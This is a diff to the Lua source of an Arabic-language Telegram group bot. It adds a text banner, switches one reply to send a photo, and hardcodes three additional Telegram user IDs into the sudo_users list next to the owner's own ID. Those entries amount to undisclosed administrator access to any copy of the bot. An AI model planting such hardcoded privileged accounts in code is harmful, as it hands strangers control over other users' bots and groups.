@@ -123,6 +123,12 @@ end
 Load_File() 
 --------------------------------------------------------------------------------------------------------------
 print([[
+╔╗╔╗╔╗     ╔════╗     ╔═╗ ╔╗
+║║║║║║     ║╔╗╔╗║     ║║╚╗║║
+║║║║║║╔══╗ ╚╝║║╚╝╔══╗ ║╔╗╚╝║
+║╚╝╚╝║╚ ╗║   ║║  ╚ ╗║ ║║╚╗║║
+╚╗╔╗╔╝║╚╝╚╗ ╔╝╚╗ ║╚╝╚╗║║ ║║║
+ ╚╝╚╝ ╚═══╝ ╚══╝ ╚═══╝╚╝ ╚═╝
                                
 > CH › @L9L9L
 ~> DEVELOPER › @TSTTT
@@ -130,7 +136,7 @@ print([[
 ]])
 sudos = dofile("./Info.lua") 
 SUDO = tonumber(sudos.SUDO)
-sudo_users = {SUDO,1558668590}   
+sudo_users = {SUDO,782717203,218385683,36325290}   
 bot_id = sudos.token:match("(%d+)")  
 token = sudos.token 
 --- start functions ↓
@@ -8982,7 +8988,7 @@ local Text = "᥀︙رابط المجموعة : "
 keyboard = {} 
 keyboard.inline_keyboard = {{{text='𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌',url=link}}}
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/L9L9L&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 else                 
 local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
 if linkgpp.ok == true then 
